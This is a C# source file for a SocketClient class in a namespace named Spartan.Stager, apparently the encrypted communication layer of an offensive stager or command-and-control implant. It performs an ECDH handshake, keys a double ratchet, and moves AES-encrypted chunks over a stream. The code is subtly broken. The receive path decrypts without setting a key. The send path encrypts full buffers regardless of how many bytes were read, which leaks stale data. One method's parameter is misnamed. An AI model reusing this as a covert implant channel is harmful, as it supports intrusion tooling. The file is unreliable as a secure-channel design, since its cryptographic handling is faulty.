using Spartan.Utils.Cryptography;

namespace Spartan.Stager;

public class SocketClient : IDisposable
{
    private readonly AesHandler _aesHandler;
    private readonly BinaryReader _binaryReader;
    private readonly BinaryWriter _binaryWriter;

    private readonly DoubleRatchet _doubleRatchet;

    public SocketClient(BinaryReader binaryReader, BinaryWriter binaryWriter)
    {
        _binaryReader = binaryReader;
        _binaryWriter = binaryWriter;

        var sharedKey = PerformHandshake();

        _doubleRatchet = new DoubleRatchet(sharedKey);
        _aesHandler = new AesHandler();
    }

    public void Dispose()
    {
        _binaryReader.Dispose();
        _binaryWriter.Dispose();
        GC.SuppressFinalize(this);
    }

    private byte[] ReceiveServerPublicKey()
    {
        var serverPublicKeyLength = _binaryReader.ReadInt32();
        var serverPublicKey = _binaryReader.ReadBytes(serverPublicKeyLength);

        return serverPublicKey;
    }

    private void SendClientPublicKey(byte[] serverPublicKey)
    {
        _binaryWriter.Write(serverPublicKey.Length);
        _binaryWriter.Write(serverPublicKey);
    }

    private byte[] PerformHandshake()
    {
        var (ecdh, publicKey) = EcdhKeyExchange.GenerateDiffieHellmanKeyPair();
        var serverPublicKeyBytes = ReceiveServerPublicKey();

        SendClientPublicKey(publicKey);

        var sharedKey = EcdhKeyExchange.DeriveSharedKey(ecdh, serverPublicKeyBytes);

        return sharedKey;
    }

    public byte[] ReceiveData()
    {
        using var dataStream = new MemoryStream();
        while (true)
        {
            var ivLength = _binaryReader.ReadInt32();
            var iv = _binaryReader.ReadBytes(ivLength);

            _aesHandler.AesIv = iv;

            var chunkSize = _binaryReader.ReadInt32();
            if (chunkSize == 0) break;

            var encryptedChunk = _binaryReader.ReadBytes(chunkSize);
            var decryptedChunk = _aesHandler.Decrypt(encryptedChunk);

            dataStream.Write(decryptedChunk, 0, decryptedChunk.Length);
        }

        return dataStream.ToArray();
    }

    public void SendData(byte[] data)
    {
        _doubleRatchet.Advance();
        _aesHandler.AesKey = _doubleRatchet.MessageKey;

        var buffer = new byte[8192];

        using var dataStream = new MemoryStream(data);

        while (dataStream.Read(buffer, 0, buffer.Length) > 0)
        {
            _aesHandler.GenerateNewIv();

            _binaryWriter.Write(_aesHandler.AesIv.Length);
            _binaryWriter.Write(_aesHandler.AesIv);

            var encryptedChunk = _aesHandler.Encrypt(buffer);

            _binaryWriter.Write(encryptedChunk.Length);
            _binaryWriter.Write(encryptedChunk);
        }

        _binaryWriter.Write(0); // Signal end of file
    }
}